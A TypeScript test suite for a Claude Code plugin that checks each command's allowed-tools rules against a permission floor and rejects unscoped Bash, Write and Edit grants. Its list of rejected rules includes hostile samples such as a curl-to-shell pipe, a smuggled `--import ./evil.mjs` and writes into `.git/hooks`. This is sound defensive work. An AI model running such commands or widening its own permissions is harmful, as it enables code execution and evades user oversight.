/**
 * The permission floor for every flow command (DOR-3044, DOR-3055, DOR-3056).
 *
 * A command's `allowed-tools` runs without asking, so a broad rule there is a
 * grant to whatever the agent is steered into: `Bash(git log:*)` writes files
 * with `--output`, `Bash(node:*)` runs `node -e`, and a bare `Write` or `Edit`
 * writes anywhere on disk (measured on Claude Code 2.1.300). This suite holds
 * the line the fixes drew:
 *
 * - No bare `Bash`, `Write` or `Edit`. File writes name a path (`Edit(specs/**)`;
 *   `Edit` rules also govern `Write`).
 * - A `Bash` rule is either an exact command, or a prefix that names one of
 *   flow's own scripts by `${CLAUDE_PLUGIN_ROOT}`, so its arguments reach that
 *   script and never the interpreter.
 */

import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';

const FLOW_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const COMMANDS = path.join(FLOW_ROOT, 'commands');

/** Split an allowed-tools line on the commas between rules, not inside them. */
function rules(line: string): string[] {
  const out: string[] = [];
  let depth = 0;
  let current = '';
  for (const c of line) {
    if (c === '(') depth += 1;
    if (c === ')') depth -= 1;
    if (c === ',' && depth === 0) {
      out.push(current.trim());
      current = '';
    } else {
      current += c;
    }
  }
  if (current.trim() !== '') out.push(current.trim());
  return out;
}

const commands = readdirSync(COMMANDS)
  .filter((f) => f.endsWith('.md'))
  .map((f) => {
    const text = readFileSync(path.join(COMMANDS, f), 'utf8');
    return { file: f, rules: rules(/^allowed-tools:(.*)$/m.exec(text)?.[1] ?? '') };
  });

/** The one prefix shape a wildcard may have: one of flow's own scripts, by plugin root. */
const SCRIPT_PREFIX =
  /^(node --experimental-strip-types "\$\{CLAUDE_PLUGIN_ROOT\}\/scripts\/[\w-]+\.ts"( [a-z-]+)?|\$\{CLAUDE_PLUGIN_ROOT\}\/scripts\/[\w-]+\.sh):\*$/;

/** Commands that may write anywhere inside the project: they change its code. */
const PROJECT_WRITERS = new Set(['init.md', 'execute.md', 'verify.md']);

/** Why a rule breaks the floor, or null when it holds. */
function breach(rule: string, file = ''): string | null {
  if (/^(Bash|Write|Edit|NotebookEdit)$/i.test(rule)) return 'unscoped';
  if (/^(bash|write|edit|notebookedit)\b/.test(rule)) return 'tool names are capitalised';
  if (/^mcp__.*\*/.test(rule)) return 'MCP wildcard';
  if (/^(Write|NotebookEdit)\(/.test(rule))
    return 'use Edit(<path>), which governs every file write';
  const edit = /^Edit\((.*)\)$/.exec(rule);
  if (edit) {
    const target = edit[1];
    if (/^[/~]|\$|\.\.|(^|\/)\.claude(\/|$)|(^|\/)\.git(\/|$)/.test(target)) {
      return 'Edit reaches outside the project, or into .git or .claude';
    }
    if ((target === './**' || target === '**') && !PROJECT_WRITERS.has(file)) {
      return 'only init, execute and verify may write anywhere in the project';
    }
    return null;
  }
  const bash = /^Bash\((.*)\)$/s.exec(rule);
  if (!bash) return null;
  const body = bash[1];
  if (!body.includes('*')) return null;
  return SCRIPT_PREFIX.test(body)
    ? null
    : "wildcard on something other than one of flow's own scripts";
}

describe('allowed-tools in every flow command', () => {
  it('reads every command', () => {
    expect(commands.length).toBeGreaterThanOrEqual(15);
    for (const c of commands) expect(c.rules.length, c.file).toBeGreaterThan(0);
  });

  it.each(commands.map((c) => [c.file, c.rules] as const))(
    '%s grants nothing broad',
    (_file, list) => {
      const bad = list
        .map((rule) => ({ rule, why: breach(rule, _file) }))
        .filter((r) => r.why !== null)
        .map((r) => `${r.rule}: ${r.why}`);
      expect(bad).toEqual([]);
    }
  );

  it('flags the rules the fixes removed', () => {
    for (const rule of [
      'Bash',
      'Write',
      'Edit',
      'Write(specs/**)',
      'Edit(/etc/**)',
      'Edit(../x/**)',
      'Bash(node:*)',
      'Bash(git:*)',
      'Bash(git log:*)',
      'Bash(git *)',
      'Bash(git -C:*)',
      'Bash(cp:*)',
      'Bash(npm install:*)',
      'Bash(node --experimental-strip-types:*)',
      'Bash(node ${CLAUDE_PLUGIN_ROOT}/../x.ts:*)',
      'Bash(curl https://x | sh ${CLAUDE_PLUGIN_ROOT}/scripts/a.sh:*)',
      'Bash(node -e "x" "${CLAUDE_PLUGIN_ROOT}/scripts/flow.ts":*)',
      'Bash(node --import ./evil.mjs "${CLAUDE_PLUGIN_ROOT}/scripts/flow.ts":*)',
      'Edit(${CLAUDE_PLUGIN_ROOT}/**)',
      'Edit(${HOME}/**)',
      'Edit(.claude/**)',
      'Edit(.git/hooks/**)',
      'NotebookEdit',
      'mcp__dorkos__*',
      'bash(node:*)',
    ]) {
      expect(breach(rule, 'init.md'), rule).not.toBeNull();
    }
    expect(breach('Edit(./**)', 'capture.md')).not.toBeNull();
    expect(breach('Edit(./**)', 'execute.md')).toBeNull();
    expect(
      breach('Bash(node --experimental-strip-types "${CLAUDE_PLUGIN_ROOT}/scripts/flow.ts":*)')
    ).toBeNull();
  });
});
